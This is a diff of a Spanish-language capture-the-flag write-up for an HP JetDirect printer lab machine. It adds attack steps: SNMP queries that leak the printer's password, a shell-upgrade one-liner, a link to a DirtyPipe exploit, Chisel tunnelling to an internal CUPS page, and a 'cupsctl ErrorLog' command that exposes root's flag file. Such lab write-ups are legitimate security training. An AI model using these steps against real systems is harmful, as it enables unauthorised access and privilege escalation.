@@ -44,59 +44,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.93 seconds
 
 </pre>
 
-Podemos realizar un escaneo exhaustivo al puerto 23 con:
-
-<pre>
-nmap -sCV -p23 10.10.11.107 -oN targeted
-</pre>
-
-Esto nos dice poco, peor sabemos que el pueto 23 es un puerto telnet.
-
-
-<pre>
-❯ /bin/cat targeted
-# Nmap 7.92 scan initiated Sun Jul 10 22:21:25 2022 as: nmap -sCV -p23 -oN targeted 10.10.11.107
-Nmap scan report for 10.10.11.107
-Host is up (0.046s latency).
-
-PORT   STATE SERVICE VERSION
-23/tcp open  telnet?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
-|     JetDirect
-|     Password:
-|   NULL: 
-|_    JetDirect
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port23-TCP:V=7.92%I=7%D=7/10%Time=62CB34CC%P=x86_64-pc-linux-gnu%r(NULL
-SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
-SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
-SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
-SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
-SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
-SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
-SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
-SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
-SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
-SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
-SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
-SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
-SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
-SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
-SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
-SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
-SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
-SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
-SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
-SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
-SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
-SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
-SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
-SF:irect\n\nPassword:\x20");
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sun Jul 10 22:24:10 2022 -- 1 IP address (1 host up) scanned in 165.07 seconds
-</pre>
+Podemos realizar un escaneo exhaustivo al puerto 23. Tampoco nos dice mucho.
 
 ## Explotación
 
@@ -136,14 +84,14 @@ Nmap done: 1 IP address (1 host up) scanned in 4.82 seconds
            Raw packets sent: 321 (18.892KB) | Rcvd: 12 (939B)
 </pre>
 
-La utilidad ostrada por **S4vitar** nos indica varoas coas, pero la mas importante es el número 1 del final. S o se le pasa número toma por defecto el 2 que es un nodo por encima de la ráiz:
+La utilidad mostrada por **S4vitar** nos indica varoas coas, pero la mas importante es el número 1 del final. S o se le pasa número toma por defecto el 2 que es un nodo por encima de la ráiz:
 
 <pre>
 snmpwalk -c public -v2c 10.10.11.107
 iso.3.6.1.2.1 = STRING: "HTB Printer"
 </pre>
 
-Nos devuelve información del sercidor de impresión. Si le ponemos un 1 nos dá información desde el inicio del árbol de la jerarquia.
+Nos devuelve información del servidor de impresión. Si le ponemos un 1 nos dá información desde el inicio del árbol de la jerarquia.
 
 
 <pre>
@@ -165,6 +113,8 @@ P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5# "2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5
 
 Podemos intuir que la password es **P@ssw0rd@123!!123**.
 Tambien podríamos haberlo decodificado en alguna herramienta online.
+
+
 
 Probamos a entrar con dicha password.
 
@@ -248,10 +198,41 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 </pre>
 
 
+### Otro método.
+
+Se puede buscar por internet "HP JetDirect obtain password"
+
+Se pueden encontrar ṕaginas donde se comenta como obtenet la password con el comando 
+
+
+<pre>
+snmpget -v 1 -c public 192.168.2.46 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+</pre>
+
+## Escalada de privilegios
+
+### Metodo 1: 
+
+Explotación de la vulnerabilidad dirtyPipe.
+
+https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
 
 
 
+### Metodo 2: CUPS
 
+En la máquina estça abierto internamente el puerto 631 que expone una WEB de CUPS.
+Se puede hacer accesible desde nuestra máquina utilizando **Chisel**.
 
+Una vez en la Web hay una vulnerabilidad que nos permite ver la flag.
 
+Podemos cambiar la ruta del fichero de log:
+
+<pre>
+cupsctl ErrorLog="/root/root.txt"
+</pre>
+
+Y en la web visualizar el LOG.
+
+# Se ampliar
 
